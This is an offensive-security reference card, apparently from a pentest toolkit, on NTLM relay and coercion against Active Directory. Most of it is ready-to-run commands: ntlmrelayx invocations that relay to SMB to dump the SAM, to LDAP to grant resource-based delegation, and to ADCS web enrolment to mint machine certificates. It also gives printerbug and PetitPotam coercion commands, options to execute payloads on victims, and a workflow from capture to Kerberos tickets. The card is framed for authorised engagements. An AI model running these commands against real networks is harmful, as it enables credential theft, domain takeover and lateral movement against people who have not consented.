---
tool: NTLM relay and coercion
slug: ntlm-relay
kind: technique
stages: [delivery, actions-on-objectives]
category: Relaying captured authentication
platforms: [linux, network]
services: [smb, http, ldap]
ports: [445, 139, 80, 389, 88]
tags: [ntlm, relay, coercion, mitm, active-directory, ntlmrelayx]
attack: [T1557.001, T1187, T1210]
summary: When a machine or user authenticates to you, forward that authentication straight to another host instead of cracking it. Pair ntlmrelayx with a coercion (PetitPotam, printer bug, Coercer) to make a target authenticate on demand. The route to a shell, a hash dump or an ADCS certificate from one captured NTLM.
references:
  - The Hacker Recipes: NTLM relay | https://www.thehacker.recipes/ad/movement/ntlm/relay
  - The Hacker Recipes: coercions | https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/
---

## When to reach for it

Responder captures an NTLMv2 hash, but it is not pass-the-hash material and machine-account hashes (`$`) rarely crack. Relaying forwards that authentication to a *third* host while it is still live, so you act as the authenticating account without ever knowing its password. It works only where the target does not enforce signing: SMB signing off (check with `netexec smb <range> --gen-relay-list targets.txt`), or LDAP where channel binding is not required.

A relay needs an authentication to forward. Either wait for one with Responder, or force one with a coercion: a low-privilege account can make a Windows host authenticate to you over MS-RPRN (printer bug), MS-EFSR (PetitPotam) or several other RPC methods.

## Key flags

- `ntlmrelayx.py -tf targets.txt` relays to a list; `-t ldap://DC` to one target. `-smb2support` for modern SMB.
- `-i` opens an interactive SMB client on success; `-c 'command'` runs a command; `-e payload.exe` executes one.
- `--delegate-access` (LDAP relay) grants RBCD over the victim computer; `--escalate-user USER` for a shadow-credential path.
- `--adcs --template <name>` relays to an ADCS web endpoint (ESC8) and prints a certificate.
- `-socks` keeps authenticated sessions open behind a SOCKS proxy for reuse.
- Coercion: `Coercer coerce -u user -p pass -d DOMAIN -t TARGET -l LISTENER`; PetitPotam and printerbug take `LISTENER TARGET`.

## Commands

Relay SMB to a list of signing-off hosts and dump the SAM on any you land on as admin:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Relay to LDAP on the DC and grant yourself resource-based delegation over the victim computer:

```bash
ntlmrelayx.py -t ldap://DOMAIN --delegate-access --no-dump
```

Relay to the ADCS web enrolment (ESC8) to mint a certificate for the authenticating machine:

```bash
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

Coerce the target into authenticating to your relay (printer bug, then PetitPotam):

```bash
printerbug.py DOMAIN/user:pass@TARGET LISTENER
petitpotam.py -u user -p pass -d DOMAIN LISTENER TARGET
```

## Workflow

1. Find relay-worthy targets: SMB signing off, or an LDAP/ADCS endpoint without binding enforced.
2. Start `ntlmrelayx` pointed at them with the outcome you want (`-i`, `-c`, `--delegate-access`, `--adcs`).
3. Trigger an authentication: wait on Responder, or coerce a specific host.
4. The relayed session acts as the victim account; collect the shell, hash dump, certificate or RBCD it yields.
5. Turn the delegation or certificate into a Kerberos ticket and move on from there.

## Notes

Relaying and coercion force real authentications across the network and can disrupt the coerced host, so keep both inside the agreed window and record every target and listener for the report. Turn Responder's SMB and HTTP servers off while relaying, or it answers instead of forwarding. In-scope and authorised use only; the sessions, certificates and tickets this yields are sensitive loot to handle with the rest of the engagement data.
